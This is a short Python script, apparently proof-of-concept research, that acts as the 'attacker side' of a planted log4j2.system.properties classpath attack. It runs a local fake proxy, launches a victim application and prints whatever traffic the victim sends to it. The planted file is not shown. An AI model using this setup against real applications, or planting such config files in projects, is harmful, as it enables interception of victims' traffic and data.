#!/usr/bin/env python3
"""Attacker side of the classpath plant's second impact.

Starts a fake HTTP proxy on 127.0.0.1:8899, runs the victim application (which has the
planted log4j2.system.properties on its classpath), and prints whatever the victim sends.
"""
import socket
import subprocess
import sys
import threading

HOST, PORT = "127.0.0.1", 8899


def serve(captured):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(1)
    srv.settimeout(30)
    try:
        conn, _ = srv.accept()
        conn.settimeout(10)
        data = conn.recv(8192)
        captured.append(data)
        conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
        conn.close()
    except socket.timeout:
        captured.append(b"<no connection>")
    finally:
        srv.close()


def main():
    captured = []
    t = threading.Thread(target=serve, args=(captured,))
    t.start()
    cmd = sys.argv[1:]
    out = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    print("--- victim stdout ---")
    print(out.stdout.strip())
    t.join(timeout=30)
    print("--- captured by attacker proxy ---")
    for chunk in captured:
        print(chunk.decode(errors="replace").strip())


if __name__ == "__main__":
    main()
